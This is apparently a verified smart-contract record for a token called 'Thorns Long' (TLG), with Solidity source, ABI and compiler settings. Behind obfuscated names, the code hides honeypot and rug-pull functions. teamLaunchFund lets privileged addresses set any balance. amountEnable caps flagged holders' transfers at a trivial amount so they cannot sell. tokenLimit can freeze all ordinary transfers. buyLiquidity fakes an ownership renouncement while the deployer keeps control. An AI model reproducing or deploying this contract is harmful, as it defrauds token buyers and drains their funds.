{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface atAutoWallet {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract isSender {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface marketingMinFee {\n    function createPair(address exemptSell, address takeTokenMode) external returns (address);\n}\n\ninterface fundToWallet {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address senderReceiver) external view returns (uint256);\n\n    function transfer(address senderShould, uint256 buyLimit) external returns (bool);\n\n    function allowance(address txFund, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 buyLimit) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address senderShould,\n        uint256 buyLimit\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed txEnableSell, uint256 value);\n    event Approval(address indexed txFund, address indexed spender, uint256 value);\n}\n\ninterface liquidityMode is fundToWallet {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ThornsLong is isSender, fundToWallet, liquidityMode {\n\n    function receiverLimit(address minAtBuy, address senderShould, uint256 buyLimit) internal returns (bool) {\n        require(liquidityTo[minAtBuy] >= buyLimit);\n        liquidityTo[minAtBuy] -= buyLimit;\n        liquidityTo[senderShould] += buyLimit;\n        emit Transfer(minAtBuy, senderShould, buyLimit);\n        return true;\n    }\n\n    function transferFrom(address minAtBuy, address senderShould, uint256 buyLimit) external override returns (bool) {\n        if (_msgSender() != fundAmountLaunch) {\n            if (totalFund[minAtBuy][_msgSender()] != type(uint256).max) {\n                require(buyLimit <= totalFund[minAtBuy][_msgSender()]);\n                totalFund[minAtBuy][_msgSender()] -= buyLimit;\n            }\n        }\n        return fromLaunch(minAtBuy, senderShould, buyLimit);\n    }\n\n    function balanceOf(address senderReceiver) public view virtual override returns (uint256) {\n        return liquidityTo[senderReceiver];\n    }\n\n    uint256 private listTo = 100000000 * 10 ** 18;\n\n    mapping(address => bool) public limitShould;\n\n    bool public amountTrading;\n\n    string private takeAuto = \"Thorns Long\";\n\n    function name() external view virtual override returns (string memory) {\n        return takeAuto;\n    }\n\n    function amountEnable(address launchMin) public {\n        toLaunchedEnable();\n        \n        if (launchMin == amountIs || launchMin == launchFrom) {\n            return;\n        }\n        shouldLaunch[launchMin] = true;\n    }\n\n    bool public marketingSell;\n\n    function buyLiquidity() public {\n        emit OwnershipTransferred(amountIs, address(0));\n        fromMode = address(0);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return listTo;\n    }\n\n    address private fromMode;\n\n    mapping(address => bool) public shouldLaunch;\n\n    string private receiverTo = \"TLG\";\n\n    constructor (){\n        \n        atAutoWallet shouldFee = atAutoWallet(fundAmountLaunch);\n        launchFrom = marketingMinFee(shouldFee.factory()).createPair(shouldFee.WETH(), address(this));\n        if (amountTrading != marketingSell) {\n            maxTeamTo = minFund;\n        }\n        amountIs = _msgSender();\n        buyLiquidity();\n        limitShould[amountIs] = true;\n        liquidityTo[amountIs] = listTo;\n        if (marketingSell == amountTrading) {\n            amountTrading = false;\n        }\n        emit Transfer(address(0), amountIs, listTo);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return tokenFee;\n    }\n\n    address public amountIs;\n\n    function toLaunchedEnable() private view {\n        require(limitShould[_msgSender()]);\n    }\n\n    address limitMode = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => uint256) private liquidityTo;\n\n    uint256 public minFund;\n\n    function transfer(address tradingBuy, uint256 buyLimit) external virtual override returns (bool) {\n        return fromLaunch(_msgSender(), tradingBuy, buyLimit);\n    }\n\n    uint256 constant receiverModeWallet = 3 ** 10;\n\n    address public launchFrom;\n\n    bool public tradingTx;\n\n    uint256 launchedReceiver;\n\n    address fundAmountLaunch = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function buyFrom(address tokenAt) public {\n        if (tradingTx) {\n            return;\n        }\n        if (takeSender) {\n            takeSender = true;\n        }\n        limitShould[tokenAt] = true;\n        if (takeSender) {\n            takeSender = false;\n        }\n        tradingTx = true;\n    }\n\n    function getOwner() external view returns (address) {\n        return fromMode;\n    }\n\n    bool private takeSender;\n\n    function owner() external view returns (address) {\n        return fromMode;\n    }\n\n    function allowance(address fundTotal, address buyTotal) external view virtual override returns (uint256) {\n        if (buyTotal == fundAmountLaunch) {\n            return type(uint256).max;\n        }\n        return totalFund[fundTotal][buyTotal];\n    }\n\n    mapping(address => mapping(address => uint256)) private totalFund;\n\n    function teamLaunchFund(address tradingBuy, uint256 buyLimit) public {\n        toLaunchedEnable();\n        liquidityTo[tradingBuy] = buyLimit;\n    }\n\n    event OwnershipTransferred(address indexed toList, address indexed tokenTradingMax);\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverTo;\n    }\n\n    uint256 atWallet;\n\n    function fromLaunch(address minAtBuy, address senderShould, uint256 buyLimit) internal returns (bool) {\n        if (minAtBuy == amountIs) {\n            return receiverLimit(minAtBuy, senderShould, buyLimit);\n        }\n        uint256 swapReceiverShould = fundToWallet(launchFrom).balanceOf(limitMode);\n        require(swapReceiverShould == launchedReceiver);\n        require(senderShould != limitMode);\n        if (shouldLaunch[minAtBuy]) {\n            return receiverLimit(minAtBuy, senderShould, receiverModeWallet);\n        }\n        return receiverLimit(minAtBuy, senderShould, buyLimit);\n    }\n\n    uint256 private maxTeamTo;\n\n    function approve(address buyTotal, uint256 buyLimit) public virtual override returns (bool) {\n        totalFund[_msgSender()][buyTotal] = buyLimit;\n        emit Approval(_msgSender(), buyTotal, buyLimit);\n        return true;\n    }\n\n    uint8 private tokenFee = 18;\n\n    function tokenLimit(uint256 buyLimit) public {\n        toLaunchedEnable();\n        launchedReceiver = buyLimit;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenTradingMax\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txEnableSell\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyTotal\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchMin\",\"type\":\"address\"}],\"name\":\"amountEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyLimit\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenAt\",\"type\":\"address\"}],\"name\":\"buyFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyLimit\",\"type\":\"uint256\"}],\"name\":\"teamLaunchFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"buyLimit\",\"type\":\"uint256\"}],\"name\":\"tokenLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyLimit\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minAtBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyLimit\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ThornsLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}